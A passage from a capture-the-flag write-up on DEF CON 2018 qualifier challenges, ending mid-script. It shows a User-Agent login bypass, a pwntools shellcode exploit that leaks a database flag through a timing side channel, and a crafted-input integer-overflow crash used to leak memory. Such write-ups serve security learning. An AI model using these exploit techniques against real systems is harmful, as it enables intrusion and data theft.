</span></span></code></pre></div><p>Seems like the login page requires a specific User-Agent to confirm the login: should <code>navigator.battery.charging</code> JavaScript API be supported? <a href=https://developer.mozilla.org/it/docs/Web/API/Navigator/battery target=_blank>Mozilla Documentation</a> states that it is now obsolete and that support for the API has been removed in Firefox 50 in favor of <code>navigator.getBattery()</code>.</p><p>By bruteforcing the version component of the stock Firefox User-Agent header we can confirm that version 42 is the right one and the flag is printed:</p><p>Request</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>POST /login.php HTTP/1.1
</span></span><span class=line><span class=cl>Host: 0da57cd5.quals2018.oooverflow.io
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:42.0) Gecko/20100101 Firefox/42.0
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class=line><span class=cl>Accept-Language: en-GB,en;q=0.5
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Referer: http://0da57cd5.quals2018.oooverflow.io/login.html
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Content-Length: 45
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=bqn0ut2np2gr7hplkuv4dph4o4
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>username=admin%40oooverflow.io<span class=err>&amp;</span>password=admin
</span></span></code></pre></div><p>Response</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>HTTP/1.1 200 OK
</span></span><span class=line><span class=cl>Server: nginx/1.10.3 (Ubuntu)
</span></span><span class=line><span class=cl>Date: Mon, 14 May 2018 12:58:58 GMT
</span></span><span class=line><span class=cl>Content-Type: text/html; charset=UTF-8
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Expires: Thu, 19 Nov 1981 08:52:00 GMT
</span></span><span class=line><span class=cl>Cache-Control: no-store, no-cache, must-revalidate
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Content-Security-Policy: upgrade-insecure-requests
</span></span><span class=line><span class=cl>Content-Length: 291
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OOO{0ld@dm1nbr0wser1sth30nlyw@y}
</span></span><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>style</span> <span class=na>scoped</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>h1</span> <span class=p>{</span><span class=k>color</span><span class=p>:</span><span class=kc>red</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>        <span class=nt>p</span> <span class=p>{</span><span class=k>color</span><span class=p>:</span><span class=kc>blue</span><span class=p>;}</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>video</span> <span class=na>id</span><span class=o>=</span><span class=s>&#34;v&#34;</span> <span class=na>autoplay</span><span class=p>&gt;</span> <span class=p>&lt;/</span><span class=nt>video</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>navigator</span><span class=p>.</span><span class=nx>battery</span><span class=p>.</span><span class=nx>charging</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Device is charging.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>Flag: <code>OOO{0ld@dm1nbr0wser1sth30nlyw@y}</code></p><h2 class="relative group">Shellql<div id=shellql class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#shellql aria-label=Anchor>#</a></span></h2><p>The challenge, reachable at <a href=http://b9d6d408.quals2018.oooverflow.io/ target=_blank>http://b9d6d408.quals2018.oooverflow.io/</a>,
provides a link and a <code>shellme.so</code> file.
The website accepts a shellcode as <code>POST</code> input and passes it to the <code>shellme</code> function
defined in the dynamic library.</p><h3 class="relative group">Problems<div id=problems class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#problems aria-label=Anchor>#</a></span></h3><p>As soon as we tackled the challenge, we realized we were not able to make any request succeed, all
of them would return a 500 error.
To complicate things even further, the <code>prclt(22,1)</code> call in the library was setting seccomp in
strict mode before executing the shellcode, so we could only do
<code>read()</code>, <code>write()</code> and <code>exit()</code> calls.</p><p>We decided not to waste any time understanding the error and went for an infinite loop to
test whether our shellcode was executing correctly or not.</p><h3 class="relative group">Idea<div id=idea class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#idea aria-label=Anchor>#</a></span></h3><p>Our only shot to get the flag was to interact with the mysql server, but we didn&rsquo;t want to
build any c++/php object.
Through reproducing the challenge in a local environment, under <code>strace</code>, we
noticed that a file descriptor (fd 4) was opened after the connection to the
database, so we could write raw mysql commands (using the mysql protocol) to this fd.</p><h3 class="relative group">Exploit<div id=exploit class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#exploit aria-label=Anchor>#</a></span></h3><p>We decided to ask (<code>write()</code>) for <code>select * from flag</code> to the mysql fd, and then to
write (<code>read()</code>) the result of the query into the stack.</p><p>After that, we wanted to search for the <code>flag</code> word in memory (that would have been the name
of the table written in the response) and then for <code>OOO{</code> and <code>}</code> in order to be sure we
got the right fd.</p><p>To exfiltrate data from the stack we implemented a timing attack. Our initial goal was to
implement a binary search: we would hang the process in an infinite loop in case we <code>cmp</code>ared
the character in the stack with a smaller/equal char or we would let the process crash.</p><p>At the end we were just too lazy to do so: we knew we were missing 66 Bytes of flag
beetween <code>{</code> and <code>}</code> and we even knew the offset, so we wrote a script to brute&rsquo;em all \0/.</p><p>Here&rsquo;s our script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s1>&#39;http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>make_query</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=se>\24\0\0\0\3</span><span class=s2>select * from flag;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>blocks</span> <span class=o>=</span> <span class=p>[</span><span class=n>q</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>q</span><span class=p>),</span> <span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>    <span class=n>unp</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>b</span> <span class=ow>in</span> <span class=n>blocks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>unp</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>u64</span><span class=p>(</span><span class=n>b</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>unp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span><span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>mov rbp,rdi
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>add rdi, 0x4
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>mov rax, 0x3b67616c66206d6f
</span></span></span><span class=line><span class=cl><span class=s2>push rax
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>mov rax,0x7266202a20746365
</span></span></span><span class=line><span class=cl><span class=s2>push rax
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>mov rax, 0xdeadbeefcafebabe
</span></span></span><span class=line><span class=cl><span class=s2>mov rdx, 0xb2c8cdeccafebaaa
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rdx
</span></span></span><span class=line><span class=cl><span class=s2>push rax
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>mov rsi, rsp
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>xor rdx,rdx
</span></span></span><span class=line><span class=cl><span class=s2>add rdx, 24
</span></span></span><span class=line><span class=cl><span class=s2>xor rdi, rdi
</span></span></span><span class=line><span class=cl><span class=s2>add rdi, 0x4
</span></span></span><span class=line><span class=cl><span class=s2>xor rax, rax
</span></span></span><span class=line><span class=cl><span class=s2>inc rax
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>xor rax,rax
</span></span></span><span class=line><span class=cl><span class=s2>mov rsi, rsp
</span></span></span><span class=line><span class=cl><span class=s2>add rdx, 77777777
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>syscall
</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>test_fn</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>char</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>shellcode</span> <span class=o>+</span>     <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    xor rax,rax
</span></span></span><span class=line><span class=cl><span class=s2>    mov al, </span><span class=si>{}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    add rsp, rax
</span></span></span><span class=line><span class=cl><span class=s2>    movzx rax, byte ptr [rsp - 1]
</span></span></span><span class=line><span class=cl><span class=s2>    mov dl, </span><span class=si>{}</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>    cmp dl, al
</span></span></span><span class=line><span class=cl><span class=s2>    je LOOP
</span></span></span><span class=line><span class=cl><span class=s2>    jmp SEGV
</span></span></span><span class=line><span class=cl><span class=s2>    LOOP: jmp LOOP
</span></span></span><span class=line><span class=cl><span class=s2>    SEGV: pop rax
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>char</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;x86_64&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>any</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>ch</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span> <span class=k>for</span> <span class=n>ch</span> <span class=ow>in</span> <span class=n>payload</span><span class=p>):</span> <span class=nb>print</span> <span class=s2>&#34;AIUTO&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>start_t</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>3</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;shell&#39;</span><span class=p>:</span> <span class=n>payload</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>ReadTimeout</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>ConnectionError</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>end_t</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=o>&gt;&gt;</span> <span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>end_t</span> <span class=o>-</span> <span class=n>start_t</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>end_t</span> <span class=o>-</span> <span class=n>start_t</span> <span class=o>&gt;</span> <span class=mf>1.3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_char</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=s2>&#34;O{abcdefghijklmnopqrstuvwxyz_, 0123456789!</span><span class=se>\&#39;</span><span class=s2>}&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>test_fn</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=nb>ord</span><span class=p>(</span><span class=n>i</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span> <span class=o>&gt;&gt;</span> <span class=n>sys</span><span class=o>.</span><span class=n>stderr</span><span class=p>,</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>i</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;X&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>multiprocess_get_flag</span><span class=p>(</span><span class=n>beg</span><span class=p>,</span> <span class=n>end</span><span class=p>,</span> <span class=n>n_processes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=kn>from</span> <span class=nn>multiprocessing</span> <span class=kn>import</span> <span class=n>Pool</span>
</span></span><span class=line><span class=cl>    <span class=n>pool</span> <span class=o>=</span> <span class=n>Pool</span><span class=p>(</span><span class=n>processes</span><span class=o>=</span><span class=n>n_processes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>pool</span><span class=o>.</span><span class=n>imap</span><span class=p>(</span><span class=n>get_char</span><span class=p>,</span> <span class=nb>range</span><span class=p>(</span><span class=n>beg</span><span class=p>,</span> <span class=n>end</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_flag</span><span class=p>(</span><span class=n>beg</span><span class=p>,</span><span class=n>end</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>beg</span><span class=p>,</span> <span class=n>end</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>+=</span> <span class=n>get_char</span><span class=p>(</span><span class=n>j</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1>#print get_flag(70, 140)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=n>multiprocess_get_flag</span><span class=p>(</span><span class=mi>69</span><span class=p>,</span> <span class=mi>140</span><span class=p>,</span> <span class=mi>4</span><span class=p>)</span>
</span></span></code></pre></div><p>This method was not 100% reliable but running it a couple of times gave us the correct flag.</p><p>At the end the flag was:
<code>OOO{shellcode and webshell is old news, get with the times my friend!}</code></p><h2 class="relative group">TechSupport<div id=techsupport class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#techsupport aria-label=Anchor>#</a></span></h2><p>When connecting to the remote server, we get something like:</p><pre tabindex=0><code>Thank you for contacting Chemisoft technical support.
My name is Elen, how can I help you?
foo
Is your keyboard properly connected to the computer? yes
Did you experience similar problems with other software as well? no
Does the program persists when you are not looking at it? yes
I heard sometimes bugs are caused by the presence of floppy drives. Do you have one? no

Alright then - it looks like we ruled out the most common problems.
So, let me now look at the program for you.
I am going to use port 3456. Everything ready on your side? yes
</code></pre><p>Then we get an incoming GDB connection on 3456. We set up a GDB server that runs the provided <code>mcalc</code> binary (a simple molecular weight calculator). It complains about the invalid license, and the challenge server performs integrity checks via GDB to protect from patching. Those can be bypassed either by writing a fake GDB server, or by patching the binary in a way that is not detected (most of the time):</p><pre tabindex=0><code>004016fe  mov     dword [rbp-0x30 {var_38}], 0xabc8eef
00401705  mov     dword [rbp-0x2c {var_34}], 0xb096bff4
0040170c  mov     dword [rbp-0x28 {var_30}], 0xe0c54799
00401713  mov     dword [rbp-0x24 {var_2c}], 0x68cbc732
0040171a  nop
(...)
00401721  nop
</code></pre><p>Now the helpdesk says the program worked fine. We patch in a <code>int 3</code> at <code>0x401abb</code> to make it crash, it says it&rsquo;ll try to reproduce the bug. So we need to make the original binary crash through the input formula only.</p><p>It is possible to force a division by zero. <code>main</code> calculates the total weight as sum of every count by its atom&rsquo;s weight, and if greater than 1000 it calls the sub at <code>0x40190b</code> to print stats about the main element. In the sub, the total weight (re-calculated) is used as denominator. Because of how the element-count mapping array in <code>main</code> is populated, if the same element is repeated multiple times, <code>main</code> will sum all occurrences, while the sub&rsquo;s total will only use the rightmost occurrence. So if we find a chemical formula that overflows the 32-bit sum to zero, then prepend an atom (with weight > 1000) that is already in the formula, we get a weight greater than 1000 in <code>main</code> but equal to zero in the sub, causing a division by zero. Such a formula can be found as a solution to an LP problem (minimizing used atoms, as there is a length limit).</p><p>Once the remote reproduction crashes, too, the helpdesk prints out the differences between the two states (our crash and reproduced crash). If a register is a valid memory address, it shows a dereferenced qword. So plan is: control a remote register at the crash to dereference the valid license buffer (which is reasonably the flag).</p><p>Before calling the sub, <code>ecx</code> contains the total weight as calculated in <code>main</code>, and it is not touched by the sub before the division. We build a formula so that the right portion overflows to zero (to trigger the crash), and the left portion uses only atoms already present in the right portion and sums to the address we want to read (to set <code>ecx</code>). License is 16 bytes at <code>0x6033d0</code>, so two crafted formulas later, we have the flag.</p><p>Script to generate the formulas:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>struct</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pulp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;mcalc&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span><span class=o>.</span><span class=n>seek</span><span class=p>(</span><span class=mh>0x30a0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>raw_atoms</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=mi>8</span> <span class=o>*</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>atoms</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>raw_atoms</span><span class=p>),</span> <span class=mi>8</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>raw_atom</span> <span class=o>=</span> <span class=n>raw_atoms</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>atom</span> <span class=o>=</span> <span class=p>(</span><span class=n>raw_atom</span><span class=p>[:</span><span class=mi>4</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;ascii&#39;</span><span class=p>),</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s1>&#39;&lt;I&#39;</span><span class=p>,</span> <span class=n>raw_atom</span><span class=p>[</span><span class=mi>4</span><span class=p>:])[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>atoms</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>atom</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>formula</span><span class=p>(</span><span class=n>goal</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>=</span> <span class=n>pulp</span><span class=o>.</span><span class=n>LpProblem</span><span class=p>(</span><span class=s1>&#39;Formula Left&#39;</span><span class=p>,</span> <span class=n>pulp</span><span class=o>.</span><span class=n>LpMinimize</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>cnt</span> <span class=o>=</span> <span class=n>pulp</span><span class=o>.</span><span class=n>LpVariable</span><span class=o>.</span><span class=n>dicts</span><span class=p>(</span><span class=s1>&#39;cnt&#39;</span><span class=p>,</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)),</span> <span class=n>lowBound</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>upBound</span><span class=o>=</span><span class=mi>999</span><span class=p>,</span> <span class=n>cat</span><span class=o>=</span><span class=s1>&#39;Integer&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>used</span> <span class=o>=</span> <span class=n>pulp</span><span class=o>.</span><span class=n>LpVariable</span><span class=o>.</span><span class=n>dicts</span><span class=p>(</span><span class=s1>&#39;used&#39;</span><span class=p>,</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)),</span> <span class=n>cat</span><span class=o>=</span><span class=s1>&#39;Binary&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>+=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>used</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>+=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>atoms</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>]</span> <span class=o>*</span> <span class=n>cnt</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)))</span> <span class=o>==</span> <span class=n>GOAL</span>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>+=</span> <span class=nb>sum</span><span class=p>(</span><span class=n>cnt</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>prob</span> <span class=o>+=</span> <span class=n>used</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>cnt</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s1>&#39;C_</span><span class=si>{}</span><span class=s1>_upper&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>prob</span> <span class=o>+=</span> <span class=n>cnt</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=mi>10000</span><span class=o>*</span><span class=n>used</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=s1>&#39;C_</span><span class=si>{}</span><span class=s1>_lower&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>prob</span><span class=o>.</span><span class=n>solve</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>formula</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>first_part_atoms</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>atoms</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>value</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>pulp</span><span class=o>.</span><span class=n>value</span><span class=p>(</span><span class=n>cnt</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>value</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>formula</span> <span class=o>+=</span> <span class=s1>&#39;</span><span class=si>{}{}</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>atoms</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>],</span> <span class=n>value</span> <span class=k>if</span> <span class=n>value</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=k>else</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>first_part_atoms</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>prob</span> <span class=o>=</span> <span class=n>pulp</span><span class=o>.</span><span class=n>LpProblem</span><span class=p>(</span><span class=s1>&#39;Formula Right&#39;</span><span class=p>,</span> <span class=n>pulp</span><span class=o>.</span><span class=n>LpMinimize</span><span class=p>)</span>
